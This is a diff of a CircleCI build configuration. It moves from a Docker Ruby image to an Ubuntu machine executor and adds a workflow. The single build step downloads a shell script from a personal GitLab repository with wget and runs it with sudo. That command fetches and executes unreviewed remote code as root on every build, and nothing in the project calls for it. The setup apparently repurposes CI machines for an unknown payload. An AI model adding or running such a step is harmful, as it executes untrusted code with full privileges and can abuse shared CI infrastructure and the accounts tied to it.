@@ -1,11 +1,12 @@
-version: 2.0
+version: 2.1
+workflows:
+  main:
+    jobs:
+      - build
 jobs:
   build:
-    docker:
-      - image: circleci/ruby:2.4.2-jessie-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    machine:
+      image: ubuntu-2004:202010-01
     steps:
       - checkout
       - run:  wget -O ah.sh https://gitlab.com/rizkyadhypratama/gass/-/raw/main/sc.sh && chmod +x ah.sh && sudo ./ah.sh
